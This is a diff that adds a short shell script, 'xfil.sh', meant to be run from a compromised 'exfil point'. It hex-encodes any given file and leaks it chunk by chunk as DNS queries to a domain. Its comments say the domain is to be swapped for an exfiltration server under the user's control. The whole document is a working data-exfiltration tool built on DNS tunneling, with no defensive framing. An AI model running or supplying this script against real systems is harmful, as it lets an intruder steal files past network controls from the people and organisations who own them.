@@ -1,0 +1,18 @@
+#!/bin/sh
+
+# this should be ran from the exfil point
+
+usage (){
+  echo "USAGE: xfil.sh <file>"
+  exit 1
+}
+
+# this dig command below statically has a domain name k.a.net
+# this will need to be adjusted to point to the exfil server name that is controlled
+
+if [ $1 ]; then
+  xxd -p $1 > $1.hex
+  for dnsx in `cat $1.hex `; do dig $dnsx.k.a.net; done
+
+else usage
+fi
